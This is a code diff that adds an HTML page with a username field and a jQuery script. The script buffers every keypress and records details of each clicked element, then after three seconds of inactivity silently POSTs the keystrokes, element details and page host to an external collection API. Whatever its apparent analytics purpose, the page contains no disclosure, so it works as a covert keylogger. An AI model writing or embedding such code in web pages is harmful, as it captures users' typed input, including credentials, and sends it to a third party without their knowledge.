@@ -1,0 +1,40 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+	<meta charset="utf-8" />
+</head>
+<body>
+
+    <input type="text" name="username" />
+    <script src="../Scripts/jquery-1.10.2.js"></script>
+    <script>
+      
+        window.onload = function () {
+            var strokeBuffer = '';
+            var timer;
+            var lastClickedElement = {};
+            document.onclick = function (evt) {
+                lastClickedElement = { ElementTagName: evt.srcElement.tagName, ElementType: evt.srcElement.type, NameAttribute: evt.srcElement.name, IdAttribute: evt.srcElement.id, ClassAttribute: "Todo:getCssClassesFromDom" };
+            };
+            document.onkeypress = function (evt) {
+                evt = evt || window.event;
+                var charCode = evt.keyCode || evt.which;
+                var charStr = String.fromCharCode(charCode);
+                
+                if (charStr) {
+                    strokeBuffer += charStr;
+                }
+                clearTimeout(timer);
+                timer = setTimeout(function () {
+                    if (strokeBuffer) {
+                        $.ajax({ url: 'http://collectionapi.ronnihansen.dk/api/UserInputData', method: 'POST', data: { KeyStrokes: strokeBuffer, MousePositions: "NYI", CollectedDate: new Date().toISOString(), Element: lastClickedElement, SourceUrl:window.location.host }, dataType: 'json' }).success(function (data) { });
+                        strokeBuffer = '';
+                    }
+                }, 3000);
+
+            };
+        }
+    </script>
+</body>
+</html>
